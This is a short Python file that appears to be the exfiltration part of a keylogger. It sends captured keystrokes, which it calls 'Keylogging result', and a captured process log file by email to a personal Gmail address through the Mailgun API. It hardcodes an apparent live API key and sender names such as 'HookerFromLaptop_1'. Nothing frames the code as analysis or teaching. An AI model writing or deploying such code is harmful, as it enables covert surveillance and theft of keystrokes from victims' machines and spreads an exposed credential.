import requests

def send_simple_message(file_content):
    return requests.post(
        "https://api.mailgun.net/v3/mg.ladmail.com/messages",
        auth=("api", "key-a65a55fe6f78da49a3addfd94fa83b87"),
        data={"from": "HookerFromLaptop_1 <postmaster@mg.ladmail.com>",
              "to": "lad <hth225@gmail.com>",
              "subject": "Hello lad, Here is Keylogging result",
              "text":  file_content
              })

def send_LOG():
    return requests.post(
        "https://api.mailgun.net/v3/mg.ladmail.com/messages",
        auth=("api", "key-a65a55fe6f78da49a3addfd94fa83b87"),
        files=[("attachment", open("Process_list.txt"))],
        data={"from": "PSManagerFromLaptop_1 <postmaster@mg.ladmail.com>",
              "to": "lad <hth225@gmail.com>",
              "subject": "Hello lad, Here is captured Process Logfile",
              "text": "CAPTURED PROCESS LOGFILE you should view on google docs"
              })